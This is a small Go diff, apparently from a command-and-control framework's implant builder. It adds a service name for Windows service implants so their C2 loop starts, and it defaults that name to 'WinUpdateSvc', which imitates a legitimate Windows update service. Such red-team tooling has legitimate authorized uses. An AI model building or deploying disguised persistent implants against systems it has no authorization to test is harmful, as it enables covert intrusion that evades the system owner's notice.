@@ -103,6 +103,15 @@ func buildImplantConfig(body generateRequest) *clientpb.ImplantConfig {
 		IncludeDNS:          strings.EqualFold(body.Transport, "dns"),
 		NetGoEnabled:        true,
 	}
+	if conf.IsService {
+		// Windows service implants need the service name baked in, otherwise the
+		// SCM-launched process never starts its C2 loop.
+		if body.Name != "" {
+			conf.ServiceName = body.Name
+		} else {
+			conf.ServiceName = "WinUpdateSvc"
+		}
+	}
 	if url := c2URL(body.Transport, body.C2URL); url != "" {
 		conf.C2 = append(conf.C2, &clientpb.ImplantC2{URL: url, Priority: 0})
 	}
